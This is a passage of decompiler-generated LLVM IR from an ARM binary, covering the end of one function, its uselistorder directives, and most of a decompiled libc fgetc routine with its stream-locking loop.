  %v2_134dc = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_134dc, i32* %r3.global-to-local, align 4
  %v2_134e0 = icmp eq i32 %v2_134d4, 0
  store i1 %v2_134e0, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_134d4, 1
  br i1 %tmp255, label %dec_label_pc_13548, label %dec_label_pc_134f4

dec_label_pc_134f4:                               ; preds = %bb254
  %v3_134f4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_134f4, i32* %lr.global-to-local, align 4
  %v1_134f8 = add i32 %v3_134f4, 12
  %v2_134f8 = inttoptr i32 %v1_134f8 to i32*
  %v3_134f8 = load i32, i32* %v2_134f8, align 4
  store i32 %v3_134f8, i32* %r3.global-to-local, align 4
  %v1_134fc = and i32 %v3_134f8, 8
  %v2_134fc = icmp eq i32 %v1_134fc, 0
  store i1 %v2_134fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134fc, label %dec_label_pc_13520, label %dec_label_pc_13504

dec_label_pc_13504:                               ; preds = %dec_label_pc_134f4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33337), i32* %r3.global-to-local, align 4
  %v1_13514 = add i32 %v1_134b8.pre, 12
  store i32 %v1_13514, i32* %r6.global-to-local, align 4
  %v1_13518 = inttoptr i32 %v1_134b8.pre to i32*
  store i32 160, i32* %v1_13518, align 4
  %v3_13518 = add i32 %v1_134b8.pre, 4
  %v4_13518 = inttoptr i32 %v3_13518 to i32*
  %v5_13518 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13518, i32* %v4_13518, align 4
  %v6_13518 = add i32 %v1_134b8.pre, 8
  %v7_13518 = inttoptr i32 %v6_13518 to i32*
  %v8_13518 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_13518, i32* %v7_13518, align 4
  br label %dec_label_pc_1354c

dec_label_pc_13520:                               ; preds = %dec_label_pc_134f4
  store i32 %v3_134f4, i32* %ip.global-to-local, align 4
  %v1_13524 = add i32 %v3_134f4, 16
  %v2_13524 = inttoptr i32 %v1_13524 to i32*
  %v3_13524 = load i32, i32* %v2_13524, align 4
  store i32 %v3_13524, i32* %r3.global-to-local, align 4
  %v7_13528 = icmp eq i32 %v3_13524, 48
  store i1 %v7_13528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13528, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_13520
  store i32 %v2_134bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13548

.thread54.thread70:                               ; preds = %dec_label_pc_13520
  %v4_13534 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_134b8.pre, i32* %r6.global-to-local, align 4
  %v3_1353c = add i32 %v4_13534, %v2_134d4
  store i32 %v3_1353c, i32* %r3.global-to-local, align 4
  store i32 %v3_1353c, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1354c

dec_label_pc_13548:                               ; preds = %bb256, %bb254
  store i32 %v1_134b8.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1354c

dec_label_pc_1354c:                               ; preds = %.thread54.thread70, %dec_label_pc_13504, %dec_label_pc_13548
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_13550 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_13550, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13554

dec_label_pc_13554:                               ; preds = %dec_label_pc_1357c, %dec_label_pc_1354c
  %v0_13554 = phi i32 [ %v1_13570, %dec_label_pc_1357c ], [ %v2_13550, %dec_label_pc_1354c ]
  %v1_13554 = inttoptr i32 %v0_13554 to i32*
  %v2_13554 = load i32, i32* %v1_13554, align 4
  store i32 %v2_13554, i32* @r1, align 4
  %v3_13554 = add i32 %v0_13554, 4
  %v4_13554 = inttoptr i32 %v3_13554 to i32*
  %v5_13554 = load i32, i32* %v4_13554, align 4
  store i32 %v5_13554, i32* %r2.global-to-local, align 4
  %v6_13554 = add i32 %v0_13554, 8
  %v7_13554 = inttoptr i32 %v6_13554 to i32*
  %v8_13554 = load i32, i32* %v7_13554, align 4
  store i32 %v8_13554, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 79208, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_13568 = load i32, i32* %r5.global-to-local, align 4
  %v1_13568 = add i32 %v0_13568, 4
  %v2_13568 = inttoptr i32 %v1_13568 to i32*
  %v3_13568 = load i32, i32* %v2_13568, align 4
  store i32 %v3_13568, i32* %r3.global-to-local, align 4
  %v0_1356c = load i32, i32* %r0.global-to-local, align 4
  %v9_1356c = icmp eq i32 %v0_1356c, %v3_13568
  store i1 %v9_1356c, i1* %cpsr_z.global-to-local, align 1
  %v1_13570 = add i32 %v0_13568, 12
  store i32 %v1_13570, i32* %r5.global-to-local, align 4
  br i1 %v9_1356c, label %dec_label_pc_1357c, label %bb257

bb257:                                            ; preds = %dec_label_pc_13554
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1359c

dec_label_pc_1357c:                               ; preds = %dec_label_pc_13554
  %v0_13580.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1357c = load i32, i32* %r6.global-to-local, align 4
  %v3_1357c = icmp ult i32 %v1_13570, %v1_1357c
  %v9_1357c = icmp eq i32 %v1_13570, %v1_1357c
  store i1 %v9_1357c, i1* %cpsr_z.global-to-local, align 1
  %v2_13580 = add i32 %v0_13580.pre, %v3_13568
  store i32 %v2_13580, i32* %r7.global-to-local, align 4
  br i1 %v3_1357c, label %dec_label_pc_13554, label %dec_label_pc_1359c

dec_label_pc_13594:                               ; preds = %.thread21, %bb239
  %v0_13594 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13594, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13294

dec_label_pc_1359c:                               ; preds = %dec_label_pc_1357c, %bb257
  %v0_1359c = phi i32 [ -1, %bb257 ], [ %v2_13580, %dec_label_pc_1357c ]
  store i32 %v0_1359c, i32* %r0.global-to-local, align 4
  store i32 %v27_12dd8, i32* @lr, align 4
  ret i32 %v0_1359c

; uselistorder directives
  uselistorder i32 %v0_1359c, { 1, 0 }
  uselistorder i32 %v1_1357c, { 1, 0 }
  uselistorder i32 %v1_13570, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13554, { 2, 1, 0 }
  uselistorder i32 %v3_134f4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_134bc, { 0, 1, 3, 2 }
  uselistorder i32 %v4_134b0, { 1, 2, 0 }
  uselistorder i32 %v0_134b0, { 1, 0 }
  uselistorder i32 %v1_134b8.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_13470, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1346c, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_13430, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_133f8, { 1, 0 }
  uselistorder i32 %v1_133f8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_133f4, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_13354, { 2, 1, 0 }
  uselistorder i32 %v2_132d4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_132c4, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_132b0, { 1, 0, 2 }
  uselistorder i32 %v5_132ac, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1333c30, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_13264, { 1, 0 }
  uselistorder i32 %v1_1325c, { 1, 2, 0 }
  uselistorder i32 %v2_13250, { 1, 0 }
  uselistorder i32 %v1_13250, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13250, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_13220, { 1, 0 }
  uselistorder i32 %v0_13220, { 0, 2, 1 }
  uselistorder i32 %v2_1321c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_13208, { 1, 0 }
  uselistorder i1 %v2_131f8, { 1, 0 }
  uselistorder i32 %v1_131f4, { 3, 2, 1, 0 }
  uselistorder i32 %v2_131f0, { 1, 0 }
  uselistorder i1 %v2_131e0, { 1, 0 }
  uselistorder i32 %v1_131d4, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_13188, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13188, { 1, 0, 2 }
  uselistorder i1 %v2_13170, { 1, 0 }
  uselistorder i32 %v5_13158, { 1, 0 }
  uselistorder i32 %v0_13144, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1312c, { 1, 2, 0 }
  uselistorder i32 %v2_13128, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_130c0, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13068, { 1, 0 }
  uselistorder double %v2_1302c, { 1, 0 }
  uselistorder i32 %v0_12fe8, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_12fdc, { 1, 0 }
  uselistorder i32 %v2_13018, { 1, 3, 0, 2 }
  uselistorder i32 %v0_12fac, { 1, 0 }
  uselistorder i32 %v5_12f68, { 1, 0 }
  uselistorder i32 %v1_12e88.v0_12e745, { 1, 0 }
  uselistorder i32 %v3_12f44, { 1, 0 }
  uselistorder i32 %v0_12f20, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12f08, { 2, 1, 0 }
  uselistorder i32 %v0_12eec, { 1, 0 }
  uselistorder i32 %v0_12e0c, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 3, 2, 1, 4, 5, 6, 7, 8, 0, 9, 10, 14, 15, 16, 11, 17, 18, 12, 19, 13, 20, 21, 22 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 26, 28, 42, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 40, 41, 63, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 66, 64, 65, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 11, 14, 16, 12, 17, 15, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 2, 10, 11, 17, 19, 20, 18, 12, 13, 21, 14, 15, 5, 22, 16, 1, 23, 24, 0, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 7, 8, 3, 4, 5, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33316), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33340), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 1, 2, 3, 4, 7, 6, 8, 5, 11, 10, 9, 12, 13 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_13594, { 1, 0 }
  uselistorder label %dec_label_pc_1354c, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_134ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13424, { 2, 0, 1 }
  uselistorder label %dec_label_pc_133f4, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_133cc, { 1, 0 }
  uselistorder label %dec_label_pc_133a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1337c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1334c, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13294, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_13284, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_131ac, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_130b8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_13068, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13060, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_12f44, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_12e60, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_135cc = load i32, i32* @r4, align 4
  store i32 %v3_135cc, i32* %stack_var_-20, align 4
  %v6_135cc = load i32, i32* @r5, align 4
  %v9_135cc = load i32, i32* @r6, align 4
  %v12_135cc = load i32, i32* @r7, align 4
  %v15_135cc = load i32, i32* @lr, align 4
  %v1_135d0 = add i32 %arg1, 52
  %v2_135d0 = inttoptr i32 %v1_135d0 to i32*
  %v3_135d0 = load i32, i32* %v2_135d0, align 4
  store i32 %v3_135d0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_135d4 = icmp eq i32 %v3_135d0, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_135d4, label %dec_label_pc_13608, label %dec_label_pc_135e4

dec_label_pc_135e4:                               ; preds = %entry
  %v1_135e4 = add i32 %arg1, 16
  %v2_135e4 = inttoptr i32 %v1_135e4 to i32*
  %v3_135e4 = load i32, i32* %v2_135e4, align 4
  store i32 %v3_135e4, i32* %r2.global-to-local, align 4
  %v1_135e8 = add i32 %arg1, 24
  %v2_135e8 = inttoptr i32 %v1_135e8 to i32*
  %v3_135e8 = load i32, i32* %v2_135e8, align 4
  store i32 %v3_135e8, i32* %r3.global-to-local, align 4
  %v3_135ec = icmp uge i32 %v3_135e4, %v3_135e8
  store i1 %v3_135ec, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_135ec, label %dec_label_pc_135fc, label %.thread

.thread:                                          ; preds = %dec_label_pc_135e4
  %v2_135f0 = inttoptr i32 %v3_135e4 to i8*
  %v3_135f0 = load i8, i8* %v2_135f0, align 1
  %v4_135f0 = zext i8 %v3_135f0 to i32
  store i32 %v4_135f0, i32* %r5.global-to-local, align 4
  %v6_135f0 = add i32 %v3_135e4, 1
  store i32 %v6_135f0, i32* %r2.global-to-local, align 4
  store i32 %v6_135f0, i32* %v2_135e4, align 4
  br label %dec_label_pc_13700

dec_label_pc_135fc:                               ; preds = %dec_label_pc_135e4
  %v1_135fc = inttoptr i32 %arg1 to i16*
  %v2_135fc = call i32 @getc_unlocked(i16* %v1_135fc)
  store i32 %v2_135fc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13700

dec_label_pc_13608:                               ; preds = %entry
  %v0_13608 = call i32 @__aeabi_read_tp()
  %v0_1360c = load i32, i32* @r7, align 4
  %v1_1360c = add i32 %v0_1360c, 64
  %v2_1360c = inttoptr i32 %v1_1360c to i32*
  %v3_1360c = load i32, i32* %v2_1360c, align 4
  store i32 %v3_1360c, i32* %r3.global-to-local, align 4
  %v1_13610 = add i32 %v0_13608, -1168
  store i32 %v1_13610, i32* @r6, align 4
  %v3_13614 = icmp uge i32 %v3_1360c, %v1_13610
  store i1 %v3_13614, i1* %cpsr_c.global-to-local, align 1
  %v9_13614 = icmp eq i32 %v3_1360c, %v1_13610
  br i1 %v9_13614, label %dec_label_pc_1365c, label %dec_label_pc_1361c

dec_label_pc_1361c:                               ; preds = %dec_label_pc_13608
  %v1_1361c = add i32 %v0_1360c, 56
  store i32 %v1_1361c, i32* @r5, align 4
  store i32 %v1_1361c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13628

dec_label_pc_13628:                               ; preds = %dec_label_pc_13634.dec_label_pc_13628_crit_edge, %dec_label_pc_1361c
  %v0_13628 = phi i32 [ %v0_13628.pre, %dec_label_pc_13634.dec_label_pc_13628_crit_edge ], [ %v1_1361c, %dec_label_pc_1361c ]
  %v1_13628 = inttoptr i32 %v0_13628 to i32*
  %v2_13628 = load i32, i32* %v1_13628, align 4
  store i32 %v2_13628, i32* %r3.global-to-local, align 4
  %v1_1362c = load i32, i32* @r4, align 4
  %v3_1362c = icmp uge i32 %v2_13628, %v1_1362c
  store i1 %v3_1362c, i1* %cpsr_c.global-to-local, align 1
  %v9_1362c = icmp eq i32 %v2_13628, %v1_1362c
  br i1 %v9_1362c, label %dec_label_pc_13634, label %dec_label_pc_1364c

dec_label_pc_13634:                               ; preds = %dec_label_pc_13628
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13644 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13644, label %dec_label_pc_13648, label %dec_label_pc_13634.dec_label_pc_13628_crit_edge

dec_label_pc_13634.dec_label_pc_13628_crit_edge:  ; preds = %dec_label_pc_13634
  %v0_13628.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13628

dec_label_pc_13648:                               ; preds = %dec_label_pc_13634
  %v0_13648 = load i32, i32* @r4, align 4
  store i32 %v0_13648, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1364c

dec_label_pc_1364c:                               ; preds = %dec_label_pc_13628, %dec_label_pc_13648
  %v0_1364c = phi i32 [ %v0_13648, %dec_label_pc_13648 ], [ %v2_13628, %dec_label_pc_13628 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1364c = icmp eq i32 %v0_1364c, 0
  br i1 %v2_1364c, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1364c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1364c, %bb
  store i32 79448, i32* @lr, align 4
  %v1_13654 = xor i1 %v2_1364c, true
  call void @__pseudo_cond_branch(i1 %v1_13654, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_13658 = load i32, i32* @r6, align 4
  %v1_13658 = load i32, i32* @r7, align 4
  %v2_13658 = add i32 %v1_13658, 64
  %v3_13658 = inttoptr i32 %v2_13658 to i32*
  store i32 %v0_13658, i32* %v3_13658, align 4
  %v0_1365c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1365c

dec_label_pc_1365c:                               ; preds = %dec_label_pc_13608, %bb18
  %v1_1366c = phi i32 [ %v0_1360c, %dec_label_pc_13608 ], [ %v0_1365c.pre, %bb18 ]
  %v1_1365c = add i32 %v1_1366c, 60
  %v2_1365c = inttoptr i32 %v1_1365c to i32*
  %v3_1365c = load i32, i32* %v2_1365c, align 4
  store i32 %v3_1365c, i32* %r2.global-to-local, align 4
  %v1_13660 = add i32 %v1_1366c, 16
  %v2_13660 = inttoptr i32 %v1_13660 to i32*
  %v3_13660 = load i32, i32* %v2_13660, align 4
  store i32 %v3_13660, i32* @r1, align 4
  %v1_13664 = add i32 %v1_1366c, 24
  %v2_13664 = inttoptr i32 %v1_13664 to i32*
  %v3_13664 = load i32, i32* %v2_13664, align 4
  store i32 %v3_13664, i32* %r3.global-to-local, align 4
  %v1_13668 = add i32 %v3_1365c, 1
  store i32 %v1_13668, i32* %r2.global-to-local, align 4
  store i32 %v1_13668, i32* %v2_1365c, align 4
  %v0_13670 = load i32, i32* @r1, align 4
  %v1_13670 = load i32, i32* %r3.global-to-local, align 4
  %v3_13670 = icmp uge i32 %v0_13670, %v1_13670
  store i1 %v3_13670, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_13670, label %dec_label_pc_13680, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1365c
  %v2_13674 = inttoptr i32 %v0_13670 to i8*
  %v3_13674 = load i8, i8* %v2_13674, align 1
  %v4_13674 = zext i8 %v3_13674 to i32
  store i32 %v4_13674, i32* %r5.global-to-local, align 4
  %v6_13674 = add i32 %v0_13670, 1
  store i32 %v6_13674, i32* @r1, align 4
  %v2_13678 = load i32, i32* @r7, align 4
  %v3_13678 = add i32 %v2_13678, 16
  %v4_13678 = inttoptr i32 %v3_13678 to i32*
  store i32 %v6_13674, i32* %v4_13678, align 4
  br label %dec_label_pc_1368c

dec_label_pc_13680:                               ; preds = %dec_label_pc_1365c
  %v0_13680 = load i32, i32* @r7, align 4
  %v1_13684 = inttoptr i32 %v0_13680 to i16*
  %v2_13684 = call i32 @getc_unlocked(i16* %v1_13684)
  store i32 %v2_13684, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %.thread2, %dec_label_pc_13680
  %v0_1368c = load i32, i32* @r7, align 4
  %v1_1368c = add i32 %v0_1368c, 60
  %v2_1368c = inttoptr i32 %v1_1368c to i32*
  %v3_1368c = load i32, i32* %v2_1368c, align 4
  %v1_13690 = add i32 %v3_1368c, -1
  store i32 %v1_13690, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13694 = icmp eq i32 %v1_13690, 0
  store i32 %v1_13690, i32* %v2_1368c, align 4
  br i1 %v2_13694, label %dec_label_pc_136a0, label %dec_label_pc_13700

dec_label_pc_136a0:                               ; preds = %dec_label_pc_1368c
  %v0_136a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_136a0 = load i32, i32* @r7, align 4
  %v2_136a0 = add i32 %v1_136a0, 64
  %v3_136a0 = inttoptr i32 %v2_136a0 to i32*
  store i32 %v0_136a0, i32* %v3_136a0, align 4
  %v0_136a4 = load i32, i32* @r7, align 4
  %v1_136a4 = add i32 %v0_136a4, 56
  store i32 %v1_136a4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_136a8

dec_label_pc_136a8:                               ; preds = %dec_label_pc_136d8.dec_label_pc_136a8_crit_edge, %dec_label_pc_136a0
  %v0_136b0 = phi i32 [ %v0_136b0.pre, %dec_label_pc_136d8.dec_label_pc_136a8_crit_edge ], [ %v1_136a4, %dec_label_pc_136a0 ]
  %v0_136a8 = phi i32 [ %v0_136a8.pre, %dec_label_pc_136d8.dec_label_pc_136a8_crit_edge ], [ %v0_136a4, %dec_label_pc_136a0 ]
  %v1_136a8 = add i32 %v0_136a8, 56
  %v2_136a8 = inttoptr i32 %v1_136a8 to i32*
  %v3_136a8 = load i32, i32* %v2_136a8, align 4
  store i32 %v3_136a8, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_136b0, i32* %r2.global-to-local, align 4
  %v1_136b422 = inttoptr i32 %v0_136b0 to i32*
  %v2_136b423 = load i32, i32* %v1_136b422, align 4
  store i32 %v2_136b423, i32* %r3.global-to-local, align 4
  %v3_136b825 = icmp uge i32 %v2_136b423, %v3_136a8
  store i1 %v3_136b825, i1* %cpsr_c.global-to-local, align 1
  %v9_136b831 = icmp eq i32 %v2_136b423, %v3_136a8
  br i1 %v9_136b831, label %dec_label_pc_136c0, label %dec_label_pc_136d8

dec_label_pc_136c0:                               ; preds = %dec_label_pc_136a8, %dec_label_pc_136c0.dec_label_pc_136b4_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_136d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_136d0, label %dec_label_pc_136d4, label %dec_label_pc_136c0.dec_label_pc_136b4_crit_edge

dec_label_pc_136c0.dec_label_pc_136b4_crit_edge:  ; preds = %dec_label_pc_136c0
  %v0_136b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_136b8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_136b4 = inttoptr i32 %v0_136b4.pre to i32*
  %v2_136b4 = load i32, i32* %v1_136b4, align 4
  store i32 %v2_136b4, i32* %r3.global-to-local, align 4
  %v3_136b8 = icmp uge i32 %v2_136b4, %v1_136b8.pre
  store i1 %v3_136b8, i1* %cpsr_c.global-to-local, align 1
  %v9_136b8 = icmp eq i32 %v2_136b4, %v1_136b8.pre
  br i1 %v9_136b8, label %dec_label_pc_136c0, label %dec_label_pc_136d8

dec_label_pc_136d4:                               ; preds = %dec_label_pc_136c0
  %v0_136d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_136d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_136d8

dec_label_pc_136d8:                               ; preds = %dec_label_pc_136a8, %dec_label_pc_136c0.dec_label_pc_136b4_crit_edge, %dec_label_pc_136d4
  %v0_136e0 = phi i32 [ %v0_136d4, %dec_label_pc_136d4 ], [ %v2_136b423, %dec_label_pc_136a8 ], [ %v2_136b4, %dec_label_pc_136c0.dec_label_pc_136b4_crit_edge ]
  %v1_136d8 = phi i32 [ %v0_136d4, %dec_label_pc_136d4 ], [ %v3_136a8, %dec_label_pc_136a8 ], [ %v1_136b8.pre, %dec_label_pc_136c0.dec_label_pc_136b4_crit_edge ]
  %v3_136d8 = icmp uge i32 %v0_136e0, %v1_136d8
  store i1 %v3_136d8, i1* %cpsr_c.global-to-local, align 1
  %v9_136d8 = icmp eq i32 %v0_136e0, %v1_136d8
  br i1 %v9_136d8, label %dec_label_pc_136e0, label %dec_label_pc_136d8.dec_label_pc_136a8_crit_edge

dec_label_pc_136d8.dec_label_pc_136a8_crit_edge:  ; preds = %dec_label_pc_136d8
  %v0_136a8.pre = load i32, i32* @r7, align 4
  %v0_136b0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_136a8

dec_label_pc_136e0:                               ; preds = %dec_label_pc_136d8
  %v2_136e0 = icmp ne i32 %v1_136d8, 0
  store i1 %v2_136e0, i1* %cpsr_c.global-to-local, align 1
  %v7_136e4 = icmp slt i32 %v1_136d8, 2
  br i1 %v7_136e4, label %dec_label_pc_13700, label %dec_label_pc_136e8

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136e0
  %v0_136ec = load i32, i32* @r1, align 4
  %v1_136ec = add i32 %v0_136ec, 129
  store i32 %v1_136ec, i32* @r1, align 4
